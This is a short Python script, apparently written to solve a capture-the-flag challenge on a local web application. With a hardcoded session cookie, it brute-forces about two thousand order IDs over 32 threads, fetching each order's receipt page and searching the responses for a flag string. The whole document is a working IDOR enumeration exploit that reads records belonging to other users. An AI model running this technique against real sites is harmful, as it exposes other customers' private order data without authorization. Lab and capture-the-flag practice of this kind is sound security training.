import requests, re, concurrent.futures
BASE = 'http://localhost:80'
COOKIE = {'session':'eyJ1c2VyX2lkIjoxMDAzMn0.aXe4nA.rSaPz3DeqGvT6eZIP5DrqlnDK2U'}
FLAG_RE = re.compile(r'FLAG\w*\{[^}]*\}|FLAG[A-Za-z0-9_\-:=]{4,}', re.I)

ids = list(range(299000, 301001))

results = []

def fetch(oid):
    try:
        r = requests.get(f"{BASE}/order/{oid}/receipt", cookies=COOKIE, timeout=2)
        if r.status_code == 200:
            m = FLAG_RE.search(r.text)
            if m:
                return (oid, m.group(0), r.text[:4000])
    except Exception:
        pass
    return None

found = []
with concurrent.futures.ThreadPoolExecutor(max_workers=32) as ex:
    for res in ex.map(fetch, ids):
        if res:
            found.append(res)
            print('FOUND', res[0], res[1])

if not found:
    print('NONE')
else:
    # Print first match details for inspection
    print('DETAILS')
    print(found[0][2])
